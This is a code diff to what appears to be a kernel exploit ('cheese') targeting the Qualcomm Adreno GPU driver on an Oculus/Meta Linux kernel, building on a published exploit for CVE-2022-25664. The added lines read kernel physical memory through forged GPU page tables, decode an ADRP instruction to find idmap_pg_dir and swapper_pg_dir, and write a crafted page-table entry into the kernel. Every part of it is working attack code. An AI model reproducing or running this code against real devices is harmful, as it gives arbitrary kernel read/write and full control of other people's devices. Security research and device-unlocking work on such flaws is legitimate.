@@ -245,6 +245,8 @@ uint64_t GetPhys(int pagemap_fd, uint64_t virt) {
 #define CP_SMMU_TABLE_UPDATE 0x53
 #define CP_CONTEXT_SWITCH_YIELD 0x6b
 
+uint64_t cheese_decode_adrp(uint32_t instr, uint64_t pc);
+
 struct cheese_gpu_rw {
     int fd;
     uint32_t ctx_id;
@@ -315,6 +317,7 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     fprintf(stderr, "\n");
 #endif
     sync_cache_to_gpu((void*)payload_buf, ((void*)payload_buf) + 0x1000);
+    sleep(1);
     // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
     // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
     int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
@@ -498,7 +501,43 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     uint32_t branch_off = read_output & ((1 << 26) - 1);
     uint64_t kernel_entry_file_off = kernel_read_offset + (branch_off << 2);
     fprintf(stderr, "kernel entry = %lx\n", kernel_physical_memory_region + kernel_entry_file_off);
-    uint64_t swapper_pg_dir_physical_address = kernel_physical_memory_region + kernel_entry_file_off - 0x2000;
+
+    uint64_t swapper_pg_dir_physical_address;
+    if (getenv("CHEESE_SWAPPER_PG_DIR_OFF")) {
+        swapper_pg_dir_physical_address = strtoull(getenv("CHEESE_SWAPPER_PG_DIR_OFF"), NULL, 0);
+    } else {
+        // we need to do one more read.
+        // __create_page_tables: https://github.com/facebookincubator/oculus-linux-kernel/blame/2ec81fa7af4875987bb74ba132661dfb4ade999a/arch/arm64/kernel/head.S#L308
+        // the adrp x0, idmap_pg_dir is always 0x80 bytes after kernel start.
+        target_read_physical_address = kernel_physical_memory_region + kernel_entry_file_off + 0x80;
+        fprintf(stderr, "target_read_physical_address = %lx\n", target_read_physical_address);
+        if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull)) {
+            return 1;
+        }
+        sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
+        if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
+            fprintf(stderr, "Can't do second read\n");
+        }
+        sleep(1);
+        sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
+        uint32_t second_read_sentinel = *(uint32_t*)(target_physical_page + 0x100);
+        fprintf(stderr, "second read sentinel: %x\n", second_read_sentinel);
+        if (second_read_sentinel != 0x41414141) {
+            fprintf(stderr, "Fail\n");
+            return 1;
+        }
+
+        read_output = *(uint32_t*)(target_physical_page + 0x104);
+        fprintf(stderr, "second read value: %x\n", read_output);
+        if (read_output == 0x45454545) {
+            fprintf(stderr, "Fail\n");
+            return 1;
+        }
+        uint64_t idmap_pg_dir_off = cheese_decode_adrp(read_output, kernel_entry_file_off + 0x80);
+        fprintf(stderr, "idmap_pg_dir_off: %lx\n", idmap_pg_dir_off);
+        swapper_pg_dir_physical_address = kernel_physical_memory_region + idmap_pg_dir_off + 0x5000;
+    }
+
     uint64_t target_write_physical_address = swapper_pg_dir_physical_address + (kKernelPageTableEntry * sizeof(uint64_t));
 
     fprintf(stderr, "writing: %lx = %lx\n", target_write_physical_address, tramp_pte_value);
@@ -506,6 +545,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
         return 1;
     }
+    sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
     if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/true, kFakeGpuAddr + (target_write_physical_address & 0xfffull), 2, (uint32_t*)&tramp_pte_value)) {
         fprintf(stderr, "Can't do second write\n");
         return 1;
